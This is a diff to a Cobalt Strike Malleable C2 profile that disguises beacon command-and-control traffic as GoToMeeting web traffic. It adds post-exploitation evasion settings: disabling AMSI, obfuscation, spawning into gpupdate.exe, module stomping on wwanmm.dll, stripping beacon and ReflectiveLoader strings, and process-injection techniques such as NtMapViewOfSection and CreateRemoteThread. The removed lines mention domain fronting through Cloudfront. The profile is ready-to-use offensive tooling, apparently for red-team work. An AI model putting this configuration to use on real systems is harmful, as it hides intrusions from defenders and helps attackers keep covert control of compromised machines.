@@ -1,5 +1,5 @@
 #gotomeeting profile
-#works good using Cloudfront with domain fronting, especially since Cloudfront doesn't verify the CNAME you enter...
+#updated for 3.14
 #this traffic mimics site traffic, NOT the actual ADP protocol used when the app loads and the meeting starts.
 #xx0hcd
 
@@ -12,14 +12,13 @@ set maxdns    "245";
 set sample_name "gotomeeting.profile";
 
 #https-certificate {
-#	set keystore "your_store_file.store";
-#	set password "your_store_pass";
+#    set keystore "your_store_file.store";
+#    set password "your_store_pass";
 #}
 
-#ordering server response headers, from 3.13.
 http-config {
-	set headers "Server, Content-Type, Brightspot-Id, Cache-Control, X-Content-Type-Options, X-Powered-By, Vary, Connection";
-	header "Content-Type" "text/html;charset=UTF-8";
+    set headers "Server, Content-Type, Brightspot-Id, Cache-Control, X-Content-Type-Options, X-Powered-By, Vary, Connection";
+        header "Content-Type" "text/html;charset=UTF-8";
 	header "Connection" "close";
 	header "Brightspot-Id" "00000459-72af-a783-feef2189";
 	header "Cache-Control" "max-age=2";
@@ -27,6 +26,8 @@ http-config {
 	header "X-Content-Type-Options" "nosniff";
 	header "X-Powered-By" "Brightspot";
 	header "Vary" "Accept-Encoding";
+        set trust_x_forwarded_for "false";
+    
 }
 
 http-get {
@@ -36,10 +37,10 @@ http-get {
     client {
 
 #set Host header to whatever
-#	header "Host" "whatever.gotomeeting.com";
-	header "Accept" "*/*";
-	header "Accept-Language" "en-US";
-	header "Connection" "close";
+#       header "Host" "whatever.gotomeeting.com";
+        header "Accept" "*/*";
+        header "Accept-Language" "en-US";
+        header "Connection" "close";
 	   
         metadata {
             base64url; 
@@ -93,10 +94,10 @@ http-post {
     client {
 
 #set Host header to whatever
-#	header "Host" "whatever.gotomeeting.com";
-	header "Accept" "*/*";
-	header "Accept-Language" "en";
-	header "Connection" "close";     
+#        header "Host" "whatever.gotomeeting.com";
+        header "Accept" "*/*";
+        header "Accept-Language" "en";
+        header "Connection" "close";     
         
         output {
             base64url; 
@@ -152,11 +153,10 @@ http-stager {
     set uri_x64 "/Meeting/32251816/";
 
     client {
-#set Host header to whatever, probably using stageless anyway right?
-#	header "Host" "whatever.gotomeeting.com";
-	header "Accept" "*/*";
-	header "Accept-Language" "en-US";
-	header "Connection" "close";
+#        header "Host" "whatever.gotomeeting.com";
+        header "Accept" "*/*";
+        header "Accept-Language" "en-US";
+        header "Connection" "close";
     }
 
     server {
@@ -169,11 +169,18 @@ http-stager {
 ###Malleable PE Options###
 #always test spawnto and module stomp before using. My examples tested on Windows 10 Pro.
 
-set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
-set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+post-ex {
 
-#attempt to disable amsi for execute-assembly, powerpick, and psinject from 3.13
-set amsi_disable "true";
+    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
+    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+
+    set obfuscate "true";
+
+    set smartinject "true";
+
+    set amsi_disable "true";
+
+}
 
 #used peclone on wwanmm.dll. 
 #don't use 'set image_size_xx' if using 'set module_xx'
@@ -194,18 +201,43 @@ stage {
 
 #module stomp
 
-	set module_x86 "wwanmm.dll";
-	set module_x64 "wwanmm.dll";
+    set module_x86 "wwanmm.dll";
+    set module_x64 "wwanmm.dll";
 
-	transform-x86 {
-	    prepend "\x90\x90\x90";
-	    strrep "ReflectiveLoader" "";
-	    strrep "beacon.dll" "";
-	}
+    transform-x86 {
+        prepend "\x90\x90\x90";
+        strrep "ReflectiveLoader" "";
+        strrep "beacon.dll" "";
+    }
 
-	transform-x64 {
-	    prepend "\x90\x90\x90";
-	    strrep "ReflectiveLoader" "";
-	    strrep "beacon.x64.dll" "";
-	}
+    transform-x64 {
+        prepend "\x90\x90\x90";
+        strrep "ReflectiveLoader" "";
+        strrep "beacon.x64.dll" "";
+    }
+}
+process-inject {
+
+    set allocator "NtMapViewOfSection";		
+
+    set min_alloc "16700";
+
+    set userwx "false";  
+    
+    set startrwx "true";
+        
+    transform-x86 {
+        prepend "\x90\x90\x90";
+    }
+    transform-x64 {
+        prepend "\x90\x90\x90";
+    }
+
+    execute {
+        CreateThread "ntdll!RtlUserThreadStart";
+        CreateThread;
+        NtQueueApcThread;
+        CreateRemoteThread;
+        RtlCreateUserThread;
+    }
 }
